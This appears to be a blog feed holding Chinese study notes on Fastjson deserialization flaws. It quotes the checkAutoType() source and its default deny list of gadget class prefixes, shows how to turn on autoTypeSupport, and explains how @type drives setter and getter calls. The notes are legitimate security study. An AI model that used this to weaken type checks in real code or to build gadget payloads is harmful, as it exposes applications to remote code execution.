JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。</p>
<p>默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。</p>
<p>denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure>

<p>这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。</p>
<p>运行能看到报错信息，说autoType不支持该类：</p>
<p><img src="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/32.png" alt="img"></p>
<p>调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：</p>
<p><img src="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/34.png" alt="img"></p>
<p><img src="../images/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002/image-20200704233707108.png" alt="image-20200704233707108"></p>
<h2 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h2><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p>
<p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p>
<ul>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
</ul>
<p>AutoType白名单设置方法：</p>
<ol>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
<li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>poc影响jdk 1.7，1.8版本，但是需要在parseObject的时候设置Feature.SupportNonPublicField，该字段在fastjson1.2.22版本引入，这么一说的话就是poc只能在1.2.22和1.2.24版本区间起作用。</p>
<p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">参考博客</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson学习笔记01</title>
    <url>/Fastjson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>银鞍照白马，飒沓如流星。</p>
</blockquote>
<p>烦人的期末终于结束了，今天来总结归纳Fastjson漏洞及原理。</p>
<p>这会是一个连载，将会有多篇文章。</p>
<a id="more"></a>

<h1 id="Fastjson基本概念-amp-组件"><a href="#Fastjson基本概念-amp-组件" class="headerlink" title="Fastjson基本概念&amp;组件"></a>Fastjson基本概念&amp;组件</h1><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口<em>JSON.toJSONString</em>和<em>JSON.parseObject/JSON.parse</em>来分别实现序列化和反序列化操作。</p>
<p><a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">项目地址</a></p>
<p>组件api使用方法也很简洁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>, VO<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure>

<h1 id="使用Fastjson进行（反）序列化"><a href="#使用Fastjson进行（反）序列化" class="headerlink" title="使用Fastjson进行（反）序列化"></a>使用Fastjson进行（反）序列化</h1><p>以下使用测试均是基于1.2.24版本的fastjson jar包</p>
<p>建议从<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24" target="_blank" rel="noopener">maven仓库</a>中找到所有版本jar包,方便漏洞复现。</p>
<p>先构建需要序列化的Student类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonTmpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//执行那个函数就会打印出来</span></span><br></pre></td></tr></table></figure>

<p>再使用Fastjson组件：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonTmpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJSerializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"0range"</span>);</span><br><span class="line">        student.setAge(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = JSON.toJSONString(student);</span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个类对象</span></span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line">        Object obj3 = JSON.parseObject(serializedStr,Student<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上使用了三种形式反序列化<br>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">serializedStr=&#123;<span class="string">"age"</span>:<span class="number">18</span>,<span class="string">"name"</span>:<span class="string">"0range"</span>&#125;</span><br><span class="line">----------</span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化：&#123;<span class="string">"name"</span>:<span class="string">"0range"</span>,<span class="string">"age"</span>:<span class="number">18</span>&#125;</span><br><span class="line">----------</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"0range"</span>,<span class="string">"age"</span>:<span class="number">18</span>&#125;</span><br><span class="line">----------</span><br><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">parseObject反序列化对象名称:FastjsonTmpl.Student</span><br><span class="line">parseObject反序列化:FastjsonTmpl.Student@<span class="number">78e03</span>bb5</span><br></pre></td></tr></table></figure>

<p>这里面parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONObject类型。</p>
<p>源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object obj = parse(text);</span><br><span class="line">        <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Fastjson反序列化类图"><a href="#Fastjson反序列化类图" class="headerlink" title="Fastjson反序列化类图"></a>Fastjson反序列化类图</h1><p><img src="../images/FastJSON%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001/image-20200622165338640.png" alt="image-20200622165338640"></p>
<p>SON：门面类，提供入口</p>
<p>DefaultJSONParser：主类</p>
<p>ParserConfig：配置相关类</p>
<p>JSONLexerBase：字符分析类</p>
<p>JavaBeanDeserializer：JavaBean反序列化类</p>
<h1 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h1><p>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。</p>
<p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p>
<p>Demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"0range"</span>);</span><br><span class="line">        student.setAge(<span class="number">18</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置了SerializerFeature.WriteClassName</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"FastjsonTmpl.Student"</span>,<span class="string">"age"</span>:<span class="number">18</span>,<span class="string">"name"</span>:<span class="string">"0range"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未设置SerializerFeature.WriteClassName</span></span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">"age"</span>:<span class="number">18</span>,<span class="string">"name"</span>:<span class="string">"0range"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>执行反序列化：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"FastjsonTmpl.Student\",\"age\":18,\"name\":\"0range\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">FastjsonTmpl.Student@<span class="number">4</span>bf558aa</span><br><span class="line">FastjsonTmpl.Student</span><br></pre></td></tr></table></figure>

<h1 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h1><p>如果需要还原出private属性的话，还需要在反序列化组件JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</p>
<p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println("setAge");</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在这两个都是private属性了，看看接下来会是什么结果。</p>
<p>修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"FastjsonTmpl.Student2\",\"age\":18,\"name\":\"0range\"&#125;"</span>;</span><br><span class="line">        Student2 obj = JSON.parseObject(jsonstring, Student2<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(obj.getName() + <span class="string">" "</span> + obj.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">FastjsonTmpl.Student2@<span class="number">4</span>bf558aa</span><br><span class="line">FastjsonTmpl.Student2</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line"><span class="number">0</span>range <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可以看到，由于没有setage方法，年龄结果是0。</p>
<p>再接着添加Feature.SupportNonPublicField：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Student2 obj = JSON.parseObject(jsonstring, Student2<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@<span class="number">2</span>c59109c</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line"><span class="number">0</span>range <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>这里写一下理解：</p>
<p>JSON对象其实就是一个字符串，那么在反序列化的时候，其实更像是用类去套出对象的信息，这里我认为比较像socket套接字的感觉，对于传进来的网络流，其实就是用socket库按照字段长度去“迎接”。</p>
<p>第一个没有设置Feature.SupportNonPublicField的情况下，其实也是正常去套，但是由于没有setage方法去“迎接”，那么默认就会将private塑形age初始化为0。</p>
<p>但是第二种情况下设置了Feature.SupportNonPublicField，那么其实就是更加暴力一点，我认为他会不管你有没有迎接我的函数，我直接把age=18摁进去，摁到对应的对象属性中，private也拦不住我。</p>
<p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p>
<h1 id="反序列化时几种类型设置的比较"><a href="#反序列化时几种类型设置的比较" class="headerlink" title="反序列化时几种类型设置的比较"></a>反序列化时几种类型设置的比较</h1><p>再来看下parseObject()的指定或不指定反序列化类型之间的差异。</p>
<p>由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。</p>
<p>修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里先说一句，我又做了一个类，并且Filed都是private的，那么自然不会有setXXX方法（有的话为什么还有设置为private呢，汗😓）。</p>
<h2 id="未设置Feature-SupportNonPublicField"><a href="#未设置Feature-SupportNonPublicField" class="headerlink" title="未设置Feature.SupportNonPublicField"></a>未设置Feature.SupportNonPublicField</h2><p>那么接下来我来继续进行实验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"fastjson2change.Student\",\"age\":66,\"name\":\"llrange\",\"address\":\"China\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;<span class="string">"age"</span>:<span class="number">0</span>&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure>

<p>可以看到反序列化失败，并且构造函数，getter函数都被调用了，最后的对象也是JSONObject对象（是一串字符串）。</p>
<p>记下来我改了细节，我添加一下反序列化制定的类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line">System.out.println(obj);</span><br><span class="line">System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>输出如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">fastjson2change.Student@<span class="number">6659</span>c656</span><br><span class="line">fastjson2change.Student</span><br></pre></td></tr></table></figure>

<p>可以看到，这次就成功了，对象被解析成了Java对象。</p>
<p>输出看到，调用了Student类的构造函数、properties成员变量的的getter方法，反序列化得到的是Student类对象即反序列化成功，也就是说<strong>只要添加了指定的类这个参数，通过@type的作用parseObject()都会成功将JSON反序列化为@type指定的类。</strong></p>
<h2 id="设置Feature-SupportNonPublicField"><a href="#设置Feature-SupportNonPublicField" class="headerlink" title="设置Feature.SupportNonPublicField"></a>设置Feature.SupportNonPublicField</h2><p>修改上一步中反序列化代码语句如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object<span class="class">.<span class="keyword">class</span>, <span class="title">Feature</span>.<span class="title">SupportNonPublicField</span>)</span>;</span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br><span class="line">System.out.println(obj);</span><br><span class="line">System.out.println(obj.getClass().getName());</span><br></pre></td></tr></table></figure>

<p>输出，发现和未设置Feature.SupportNonPublicField的是一致的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">构造函数</span><br><span class="line">getProperties</span><br><span class="line">Student@<span class="number">4</span>c00c0cf</span><br><span class="line">Student</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>根据前面的结果，有如下结论：</p>
<ul>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li>
<li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li>
</ul>
<p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用：</strong></p>
<p>满足条件的setter：</p>
<ul>
<li>函数名长度大于4且以set开头</li>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>函数名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无参数</li>
<li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li>
</ul>
<p>注意，除了getter方法和setter方法外，还有个is方法这里没有列举，可自行测试。</p>
<p>前面的properties私有属性，其类型为Properties，而Properties是继承于Hashtable，Hashtable是实现Map接口类的类，因此properties私有属性的getter方法时继承自Map，从而能够成功被Fastjson调用。</p>
